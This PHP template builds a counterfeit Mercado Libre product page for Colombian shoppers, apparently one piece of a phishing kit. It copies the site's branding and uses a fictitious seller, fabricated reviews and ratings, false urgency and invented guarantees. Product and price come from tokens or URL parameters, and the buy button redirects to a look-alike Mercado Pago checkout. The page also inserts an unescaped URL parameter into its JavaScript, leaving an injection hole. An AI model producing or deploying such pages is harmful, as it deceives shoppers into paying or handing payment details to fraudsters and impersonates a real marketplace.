<?php
require_once __DIR__ . '/../../conexion.php';
require_once __DIR__ . '/../../config.php';
require_once __DIR__ . '/../../token_helper.php';

$landing_data = null;
$token = $_GET['token'] ?? '';

if (!empty($token)) {
    $landing_data = obtenerLandingPorToken($token, $pdo);
}

if (!$landing_data && isset($_GET['landing'])) {
    $landing_slug = preg_replace('/[^a-z0-9\-]/', '', $_GET['landing']);
    $stmt = $pdo->prepare("SELECT * FROM landings WHERE slug = ?");
    $stmt->execute([$landing_slug]);
    $landing_data = $stmt->fetch();
}

if ($landing_data) {
    $producto = $landing_data['producto'];
    $precio = $landing_data['precio'];
    $landing_slug = $landing_data['slug'];
} else {
    $producto = isset($_GET['producto']) ? $_GET['producto'] : 'DJI Osmo Pocket 3 Creator Combo Color Negro';
    $precio = isset($_GET['precio']) ? $_GET['precio'] : '1500000';
    $landing_slug = isset($_GET['landing']) ? preg_replace('/[^a-z0-9\-]/', '', $_GET['landing']) : 'dji-osmo';
}

$raw_imgs = $landing_data['imagenes'] ?? [];
if (is_string($raw_imgs)) {
    $imagenes_db = json_decode($raw_imgs, true) ?: [];
} else if (is_array($raw_imgs)) {
    $imagenes_db = $raw_imgs;
} else {
    $imagenes_db = [];
}

$fallback_base = URL_LANDINGS . "/landings/{$landing_slug}";

$imagen_producto = !empty($imagenes_db['producto']) ? $imagenes_db['producto'] : "{$fallback_base}/producto.png";
$img_desktop2 = !empty($imagenes_db['desktop2']) ? $imagenes_db['desktop2'] : "{$fallback_base}/desktop2.png";
$img_desktop3 = !empty($imagenes_db['desktop3']) ? $imagenes_db['desktop3'] : "{$fallback_base}/desktop3.png";
$img_mobile2 = !empty($imagenes_db['mobile2']) ? $imagenes_db['mobile2'] : "{$fallback_base}/mobile2.png";
$img_mobile3 = !empty($imagenes_db['mobile3']) ? $imagenes_db['mobile3'] : "{$fallback_base}/mobile3.png";

// Formatear precio
$precio_formateado = number_format($precio, 0, ',', '.');
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
    <title><?php echo htmlspecialchars($producto); ?> | Cuotas sin interés</title>
    
    <!-- FUENTES MERCADO LIBRE -->
    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600&display=swap" rel="stylesheet">
    
    <style>
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 300;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 400;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 600;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
        }

        :root {
            --ml-yellow: #fff159;
            --ml-blue: #3483fa;
            --ml-blue-hover: #2968c8;
            --ml-blue-light: rgba(65,137,230,.15);
            --ml-text-black: #333333;
            --ml-text-gray: #666666;
            --ml-text-light: #999999;
            --ml-green: #00a650;
            --ml-border: #e6e6e6;
            --ml-bg: #ebebeb;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Proxima Nova', -apple-system, 'Helvetica Neue', Helvetica, Roboto, Arial, sans-serif;
            background-color: var(--ml-bg);
            color: var(--ml-text-black);
            -webkit-font-smoothing: antialiased;
        }

        /* HEADER */
        .ml-header {
            background-color: var(--ml-yellow);
            height: 100px;
            width: 100%;
            position: relative;
        }

        @media (max-width: 1024px) {
            .ml-header { height: 56px; }
        }

        /* MOCKUP NAV BAR */
        .nav-bounds {
            max-width: 1200px;
            margin: 0 auto;
            height: 100%;
            display: flex;
            align-items: center;
            padding: 0 10px;
            justify-content: space-between;
        }

        .nav-logo {
            width: 134px;
            height: 34px;
            background-image: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png');
            background-size: contain;
            background-repeat: no-repeat;
            margin-right: 40px;
            flex-shrink: 0;
        }

        .nav-search {
            flex: 1;
            max-width: 600px;
            height: 40px;
            background: #fff;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.2);
            border-radius: 2px;
            display: flex;
            align-items: center;
        }
        
        .nav-search-input {
            flex: 1;
            height: 100%;
            border: none;
            padding: 0 15px;
            font-size: 16px;
            color: var(--ml-text-black);
            font-family: inherit;
            background: transparent;
            outline: none;
        }
        
        .nav-search-input::placeholder {
            color: #bfbfbf;
        }

        .nav-search-btn {
            width: 46px;
            height: 100%;
            border: none;
            background: #fff;
            border-left: 1px solid #e6e6e6;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .nav-search-icon {
            width: 18px;
            height: 18px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23666"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>');
            background-size: contain;
        }
        
        .nav-promo {
            margin-left: 40px;
            flex-shrink: 0;
            display: block;
        }
        
        .nav-promo img {
            max-width: 340px;
            height: 39px;
            object-fit: contain;
        }

        /* MAIN CONTENT */
        .main-container {
            max-width: 1180px;
            margin: 20px auto;
            background: #fff;
            border-radius: 4px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            display: flex;
            flex-direction: row;
            overflow: hidden;
        }

        /* LEFT SIDE (IMAGES) */
        .product-gallery {
            width: 65%;
            padding: 20px;
            display: flex;
            flex-direction: row;
        }
        
        .gallery-thumbnails {
            width: 50px;
            margin-right: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .thumbnail {
            width: 50px;
            height: 50px;
            border: 1px solid var(--ml-border);
            border-radius: 4px;
            background-size: cover;
            background-position: center;
            cursor: pointer;
        }
        
        .thumbnail:hover {
            border-color: var(--ml-blue);
        }

        .main-image-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 500px;
        }

        .main-image {
            max-width: 100%;
            max-height: 500px;
            object-fit: contain;
        }

        /* RIGHT SIDE (INFO) */
        .product-info {
            width: 35%;
            padding: 24px 16px;
            border-left: 1px solid var(--ml-border);
            display: flex;
            flex-direction: column;
        }

        .product-condition {
            font-size: 14px;
            color: var(--ml-text-gray);
            margin-bottom: 8px;
        }

        .product-title {
            font-size: 22px;
            font-weight: 600;
            color: var(--ml-text-black);
            margin: 0 0 12px 0;
            line-height: 1.18;
        }
        
        .product-rating {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }
        
        .stars {
            color: var(--ml-blue);
            font-size: 14px;
            letter-spacing: 2px;
        }
        
        .rating-count {
            color: var(--ml-text-light);
            font-size: 14px;
            margin-left: 6px;
        }

        /* PRECIO */
        .price-container {
            margin-top: 10px;
            margin-bottom: 24px;
        }
        
        .price-currency {
            font-size: 18px;
            position: relative;
            top: -10px;
            font-weight: 400;
        }
        
        .price-amount {
            font-size: 36px;
            font-weight: 300;
        }
        
        .price-installments {
            font-size: 16px;
            color: var(--ml-text-black);
            margin-top: 4px;
        }
        
        .installment-highlight {
            color: var(--ml-green);
        }

        /* MÉTODOS DE PAGO / ENVÍO */
        .info-card {
            display: flex;
            margin-bottom: 24px;
        }
        
        .info-icon {
            margin-right: 12px;
            margin-top: 2px;
        }
        
        .info-content p {
            margin: 0;
            font-size: 14px;
        }
        
        .info-content .title {
            color: var(--ml-green);
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .info-content .blue-link {
            color: var(--ml-blue);
            cursor: pointer;
            font-size: 14px;
            margin-top: 4px;
            display: inline-block;
        }

        /* SELLER INFO */
        .seller-info {
            margin-top: 10px;
            font-size: 14px;
            color: var(--ml-text-black);
        }

        /* ACTION BUTTONS */
        .actions {
            margin-top: 30px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .btn {
            height: 48px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: background-color .2s;
            border: none;
            width: 100%;
        }

        .btn-primary {
            background-color: var(--ml-blue);
            color: #fff;
        }
        
        .btn-primary:hover {
            background-color: var(--ml-blue-hover);
        }

        .btn-secondary {
            background-color: var(--ml-blue-light);
            color: var(--ml-blue);
        }
        
        .btn-secondary:hover {
            background-color: rgba(65,137,230,.2);
        }

        /* POLÍTICAS */
        .policies {
            margin-top: 24px;
            font-size: 14px;
            color: var(--ml-text-light);
        }
        
        .policies p {
            margin: 0 0 10px 0;
            line-height: 1.3;
        }
        
        .policies a {
            color: var(--ml-blue);
            text-decoration: none;
        }

        /* MOBILE RESPONSIVE */
        @media (max-width: 1024px) {
            .main-container {
                flex-direction: column;
                margin: 0;
                border-radius: 0;
            }
            .product-info-wrapper {
                flex-direction: column !important;
                width: 100% !important;
            }

            .product-gallery {
                width: 100%;
                box-sizing: border-box;
                padding: 16px;
                flex-direction: column-reverse;
            }

            .gallery-thumbnails {
                flex-direction: row;
                width: 100%;
                justify-content: center;
                margin-top: 20px;
                margin-right: 0;
            }

            .product-info-center {
                width: 100% !important;
                padding: 16px !important;
            }
            .product-buybox {
                width: 100% !important;
                margin: 0 !important;
                border-left: none !important;
                border-top: 1px solid var(--ml-border) !important;
                box-shadow: none !important;
            }
            .product-info {
                width: 100%;
                box-sizing: border-box;
                border-left: none;
                border-top: 1px solid var(--ml-border);
            }

            .nav-logo {
                width: 44px;
                background-image: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__small.png');
            }
            
            #opinions-section {
                padding: 20px !important;
            }
            #opinions-section > div {
                flex-direction: column;
                gap: 20px !important;
            }
            #opinions-section .stars {
                font-size: 24px !important;
            }
            #opinions-section > div > div:first-child {
                width: 100% !important;
                text-align: center;
                margin-bottom: 20px;
            }
        }

        /* SKELETON LOADER */
        .skeleton {
            background: #e6e6e6;
            background: linear-gradient(90deg, #ececec 8%, #f5f5f5 18%, #ececec 33%);
            background-size: 200% 100%;
            animation: 1.5s skeleton-shimmer linear infinite;
            border-radius: 4px;
        }

        @keyframes skeleton-shimmer {
            to {
                background-position-x: -200%;
            }
        }

        .skeleton-box { width: 100%; height: 20px; margin-bottom: 10px; }
        .skeleton-title { height: 30px; width: 80%; margin-bottom: 15px; }
        .skeleton-price { height: 40px; width: 40%; margin-bottom: 20px; }
        .skeleton-img { width: 100%; height: 400px; margin: 20px 0; }
        .skeleton-thumb { width: 50px; height: 50px; margin-bottom: 10px; }
        .skeleton-btn { height: 48px; width: 100%; margin-bottom: 10px; border-radius: 4px; }
        
        #real-content {
            display: none; /* Oculto inicialmente */
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="ml-header">
        <div class="nav-bounds">
            <a href="#" class="nav-logo"></a>
            <div class="nav-search">
                <input type="text" class="nav-search-input" placeholder="Buscar productos, marcas y más...">
                <button type="submit" class="nav-search-btn">
                    <div class="nav-search-icon"></div>
                </button>
            </div>
            <a href="#" class="nav-promo">
                <img src="https://http2.mlstatic.com/D_NQ_889611-MLA108557929840_032026-OO.jpg" alt="Meli+ cashback">
            </a>
        </div>
    </header>

    <!-- MAIN PRODUCT PAGE SKELETON -->
    <main id="skeleton-content" class="main-container">
        <!-- IZQUIERDA SKELETON -->
        <div class="product-gallery" style="width: 50%;">
            <div class="gallery-thumbnails">
                <div class="skeleton skeleton-thumb"></div>
                <div class="skeleton skeleton-thumb"></div>
                <div class="skeleton skeleton-thumb"></div>
                <div class="skeleton skeleton-thumb"></div>
                <div class="skeleton skeleton-thumb"></div>
            </div>
            <div class="main-image-container">
                <div class="skeleton skeleton-img"></div>
            </div>
        </div>

        <!-- DERECHA SKELETON -->
        <div class="product-info-wrapper" style="width: 50%; display: flex; flex-direction: row;">
            <div class="product-info-center" style="width: 55%; padding: 24px 16px;">
                <div class="skeleton skeleton-box" style="width: 30%;"></div>
                <div class="skeleton skeleton-title"></div>
                <div class="skeleton skeleton-box" style="width: 20%;"></div>
                <div class="skeleton skeleton-price"></div>
                <div class="skeleton skeleton-box" style="width: 50%;"></div>
                <div class="skeleton skeleton-box" style="width: 40%; margin-bottom: 24px;"></div>
                <div class="skeleton skeleton-thumb" style="border-radius: 50%;"></div>
                <div class="skeleton skeleton-box" style="width: 100%; height: 60px; margin-top: 20px;"></div>
            </div>
            <div class="product-buybox" style="width: 45%; padding: 24px 16px; margin: 16px;">
                <div class="skeleton skeleton-box" style="width: 100%; height: 40px; margin-bottom: 24px;"></div>
                <div class="skeleton skeleton-box" style="width: 60%;"></div>
                <div class="skeleton skeleton-btn"></div>
                <div class="skeleton skeleton-btn"></div>
                <div class="skeleton skeleton-box" style="width: 100%; height: 80px; margin-top: 24px;"></div>
            </div>
        </div>
    </main>

    <!-- MAIN PRODUCT PAGE REAL CONTENT -->
    <div id="real-content">
        <main class="main-container">
        
        <!-- GALERÍA DE IMÁGENES -->
        <div class="product-gallery" style="width: 50%;">
            <div class="gallery-thumbnails">
                <div class="thumbnail active" onclick="changeMainImage(this, '<?php echo htmlspecialchars($imagen_producto); ?>')" style="background-image: url('<?php echo htmlspecialchars($imagen_producto); ?>'); border-color: var(--ml-blue);"></div>
                <div class="thumbnail" onclick="changeMainImage(this, '<?php echo htmlspecialchars($img_desktop2); ?>')" style="background-image: url('<?php echo htmlspecialchars($img_desktop2); ?>'); border-color: transparent;"></div>
                <div class="thumbnail" onclick="changeMainImage(this, '<?php echo htmlspecialchars($img_desktop3); ?>')" style="background-image: url('<?php echo htmlspecialchars($img_desktop3); ?>'); border-color: transparent;"></div>
                <div class="thumbnail" onclick="changeMainImage(this, '<?php echo htmlspecialchars($img_mobile2); ?>')" style="background-image: url('<?php echo htmlspecialchars($img_mobile2); ?>'); border-color: transparent;"></div>
                <div class="thumbnail" onclick="changeMainImage(this, '<?php echo htmlspecialchars($img_mobile3); ?>')" style="background-image: url('<?php echo htmlspecialchars($img_mobile3); ?>'); border-color: transparent;"></div>
            </div>
            <div class="main-image-container">
                <img id="main-product-image" src="<?php echo htmlspecialchars($imagen_producto); ?>" alt="<?php echo htmlspecialchars($producto); ?>" class="main-image">
            </div>
        </div>

        <!-- INFORMACIÓN DEL PRODUCTO (CENTRO Y DERECHA) -->
        <div class="product-info-wrapper" style="width: 50%; display: flex; flex-direction: row;">
            <!-- CENTRO -->
            <div class="product-info-center" style="width: 55%; padding: 24px 16px;">
                <div class="product-condition" style="font-size: 14px; color: var(--ml-text-gray); margin-bottom: 8px;">
                    Nuevo | +1000 vendidos
                </div>
                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                    <h1 class="product-title" style="font-size: 22px; font-weight: 600; margin: 0 0 12px 0; color: var(--ml-text-black); width: 90%;"><?php echo htmlspecialchars($producto); ?></h1>
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--ml-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="cursor: pointer;"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
                </div>
                
                <div class="product-rating" style="display: flex; align-items: center; margin-bottom: 12px;">
                    <span style="color: var(--ml-text-gray); font-size: 14px; margin-right: 4px;">4.9</span>
                    <span class="stars" style="color: var(--ml-blue); font-size: 14px; letter-spacing: 2px;">★★★★★</span>
                    <span class="rating-count" style="color: var(--ml-text-light); font-size: 14px; margin-left: 6px;">(75)</span>
                </div>

                <div style="background-color: #ff7733; color: white; font-size: 11px; font-weight: 600; display: inline-block; padding: 3px 6px; border-radius: 4px; margin-bottom: 12px;">
                    🔥 ¡ÚLTIMAS UNIDADES!
                </div>

                <div class="price-container" style="margin-bottom: 12px; margin-top: 0;">
                    <span class="price-currency" style="font-size: 20px; font-weight: 400; position: relative; top: -12px;">$</span>
                    <span class="price-amount" style="font-size: 36px; font-weight: 300;"><?php echo $precio_formateado; ?></span>
                </div>

                <div style="font-size: 16px; color: var(--ml-text-black); margin-bottom: 8px;">
                    <span style="color: var(--ml-green);">12 cuotas de $ <?php echo number_format((int)$precio / 12, 0, ',', '.'); ?> con 0% interés</span>
                </div>

                <div style="background-color: var(--ml-blue-light); color: var(--ml-blue); font-size: 12px; font-weight: 600; display: inline-block; padding: 4px 8px; border-radius: 4px; margin-bottom: 12px;">
                    15% OFF Banco BBVA
                </div>
                
                <div style="margin-bottom: 24px;">
                    <a href="#" style="color: var(--ml-blue); text-decoration: none; font-size: 14px;">Ver medios de pago y promociones</a>
                </div>

                <div style="font-size: 14px; color: var(--ml-text-black); margin-bottom: 24px;">
                    Hasta <span style="color: var(--ml-green); font-weight: 600;">$ 10.000 de cashback</span> en esta compra suscribiéndote a <span style="background-color: #e50050; color: white; font-weight: bold; border-radius: 10px; padding: 2px 6px; font-size: 11px;">meli+</span><br>
                    <a href="#" style="color: var(--ml-blue); text-decoration: none; font-size: 14px; display: inline-block; margin-top: 4px;">Suscribirme</a>
                </div>

                <div style="font-size: 16px; margin-bottom: 12px;">
                    Color: <strong>Negro</strong>
                </div>
                <div style="width: 48px; height: 48px; border: 2px solid var(--ml-blue); border-radius: 4px; padding: 2px; margin-bottom: 24px; cursor: pointer;">
                    <div style="width: 100%; height: 100%; background-image: url('<?php echo htmlspecialchars($imagen_producto); ?>'); background-size: cover; background-position: center; border-radius: 2px;"></div>
                </div>

                <div style="font-size: 18px; margin-bottom: 16px;">
                    Lo que tienes que saber de este producto
                </div>
                <ul style="font-size: 14px; color: var(--ml-text-black); padding-left: 16px; margin-bottom: 16px; line-height: 1.4;">
                    <li style="margin-bottom: 10px;">Alta calidad y durabilidad garantizada.</li>
                    <li style="margin-bottom: 10px;">Diseño moderno y funcional, ideal para el uso diario.</li>
                    <li style="margin-bottom: 10px;">Tu mejor opción, satisfacción 100% garantizada.</li>
                </ul>
                <a href="#" style="color: var(--ml-blue); text-decoration: none; font-size: 14px;">Ver características</a>
            </div>

            <!-- DERECHA (BUY BOX) -->
            <div class="product-buybox" style="width: 45%; padding: 24px 16px; border-left: 1px solid var(--ml-border); border-radius: 8px; margin: 16px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.12); height: fit-content;">
                
                <div style="margin-bottom: 24px;">
                    <div style="color: var(--ml-green); font-weight: 600; font-size: 16px; margin-bottom: 4px;">Llega gratis entre el miércoles y el sábado 22/ago <span style="font-weight: 400; color: var(--ml-text-gray); font-size: 14px;"><br>por ser tu primera compra</span></div>
                    <a href="#" style="color: var(--ml-blue); text-decoration: none; font-size: 14px;">Más detalles y formas de entrega</a>
                </div>

                <div style="font-size: 16px; font-weight: 600; margin-bottom: 24px;">
                    ¡Últimas unidades!
                </div>

                <div class="actions" style="margin-top: 0; margin-bottom: 24px;">
                    <!-- REDIRIGE AL FLUJO DE CHECKOUT -->
                    <button class="btn btn-primary" onclick="iniciarCompra()">
                        Comprar ahora
                    </button>
                    <button class="btn btn-secondary" style="margin-top: 8px;">
                        Agregar al carrito
                    </button>
                </div>

                <div style="text-align: center; margin-bottom: 24px;">
                    <img src="pse.png" alt="Pago con PSE" style="height: 35px; object-fit: contain;">
                </div>

                <div style="font-size: 14px; margin-bottom: 24px;">
                    Vendido por <span style="color: var(--ml-blue); cursor: pointer;">Distribuidora Colombiana S.A.S</span><br>
                    <span style="color: var(--ml-text-black); font-size: 13px;">+1000 ventas</span>
                </div>

                <div class="policies" style="margin-top: 0;">
                    <p style="display: flex; align-items: flex-start; margin-bottom: 16px;">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--ml-text-gray)" stroke-width="1.5" style="margin-right: 8px; flex-shrink: 0;"><path d="M21 12a9 9 0 0 1-9 9m9-9a9 9 0 0 0-9-9m9 9H3m9 9a9 9 0 0 1-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9"></path></svg>
                        <span><a href="#" style="font-weight: 600; color: var(--ml-blue); text-decoration: none;">Devolución gratis.</a> Tienes 30 días desde que lo recibes.</span>
                    </p>
                    <p style="display: flex; align-items: flex-start; margin-bottom: 16px;">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--ml-text-gray)" stroke-width="1.5" style="margin-right: 8px; flex-shrink: 0;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                        <span><a href="#" style="font-weight: 600; color: var(--ml-blue); text-decoration: none;">Compra Protegida.</a> Recibe el producto que esperabas o te devolvemos tu dinero.</span>
                    </p>
                    <p style="display: flex; align-items: flex-start; margin-bottom: 16px;">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--ml-text-gray)" stroke-width="1.5" style="margin-right: 8px; flex-shrink: 0;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
                        <span>6 meses de garantía de fábrica.</span>
                    </p>
                </div>
            </div>
        </main>
        
        <!-- OPINIONES -->
        <main class="main-container" style="flex-direction: column; padding: 40px;" id="opinions-section">
            <h2 style="font-size: 24px; font-weight: 400; margin-bottom: 30px;">Opiniones sobre <?php echo htmlspecialchars($producto); ?></h2>
            
            <div style="display: flex; gap: 40px; flex-wrap: wrap;">
                <div style="width: 30%; min-width: 250px;">
                    <div style="font-size: 64px; font-weight: 300; color: var(--ml-blue); line-height: 1;">4.9</div>
                    <div class="stars" style="font-size: 20px; margin-bottom: 8px;">★★★★★</div>
                    <div style="font-size: 14px; color: var(--ml-text-gray);">Promedio entre 75 opiniones</div>
                </div>
                
                <div style="flex: 1; min-width: 300px;">
                    <div style="border-bottom: 1px solid var(--ml-border); padding-bottom: 20px; margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                            <span class="stars" style="font-size: 14px;">★★★★★</span>
                            <span style="font-size: 12px; color: var(--ml-text-light);">Hace 1 mes</span>
                        </div>
                        <div style="font-weight: 600; margin-bottom: 8px;">Excelente producto, muy recomendado</div>
                        <p style="font-size: 14px; color: var(--ml-text-gray); margin: 0; line-height: 1.5;">La calidad es increíble, superó totalmente mis expectativas. Cumple con todo lo que promete la descripción. Muy recomendado para cualquier persona que esté dudando en comprarlo.</p>
                    </div>
                    
                    <div style="border-bottom: 1px solid var(--ml-border); padding-bottom: 20px; margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                            <span class="stars" style="font-size: 14px;">★★★★★</span>
                            <span style="font-size: 12px; color: var(--ml-text-light);">Hace 2 meses</span>
                        </div>
                        <div style="font-weight: 600; margin-bottom: 8px;">Superó mis expectativas</div>
                        <p style="font-size: 14px; color: var(--ml-text-gray); margin: 0; line-height: 1.5;">Me encantó, llegó súper rápido y en perfectas condiciones. El material se nota que es de muy buena calidad y funciona a la perfección. Definitivamente volvería a comprar.</p>
                    </div>
                    
                    <div style="border-bottom: 1px solid var(--ml-border); padding-bottom: 20px; margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                            <span class="stars" style="font-size: 14px;">★★★★★</span>
                            <span style="font-size: 12px; color: var(--ml-text-light);">Hace 3 meses</span>
                        </div>
                        <div style="font-weight: 600; margin-bottom: 8px;">La mejor compra del año</div>
                        <p style="font-size: 14px; color: var(--ml-text-gray); margin: 0; line-height: 1.5;">Relación calidad-precio inmejorable. He probado otros productos similares pero este definitivamente es el mejor de todos. Totalmente satisfecho con la compra.</p>
                    </div>
                </div>
            </div>
        </main>
    </div> <!-- Fin #real-content -->

    <!-- PANTALLA DE CARGA ML -->
    <div id="ml-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.9); z-index: 9999; flex-direction: column; justify-content: center; align-items: center;">
        <div style="width: 50px; height: 50px; border: 4px solid var(--ml-bg); border-top-color: var(--ml-blue); border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <div style="margin-top: 20px; font-size: 18px; color: var(--ml-text-black); font-weight: 600;">Procesando tu compra...</div>
    </div>

    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script>
        // Lógica de Skeleton
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('skeleton-content').style.display = 'none';
                document.getElementById('real-content').style.display = 'block';
            }, 1200); // 1.2s de skeleton
        });

        // Lógica de botón comprar
        function iniciarCompra() {
            document.getElementById('ml-loader').style.display = 'flex';
            setTimeout(function() {
                window.location.href = '../mercadopago/index.php?producto=<?php echo urlencode($producto); ?>&precio=<?php echo $precio; ?>';
            }, 1500);
        }

        // Lógica de galería de imágenes
        function changeMainImage(element, newSrc) {
            // Remove active style from all thumbnails
            let thumbnails = document.querySelectorAll('.gallery-thumbnails .thumbnail');
            thumbnails.forEach(function(thumb) {
                thumb.style.borderColor = 'transparent';
                thumb.classList.remove('active');
            });
            
            // Add active style to clicked thumbnail
            element.style.borderColor = 'var(--ml-blue)';
            element.classList.add('active');
            
            // Change main image
            document.getElementById('main-product-image').src = newSrc;
        }
    </script>
</body>
</html>
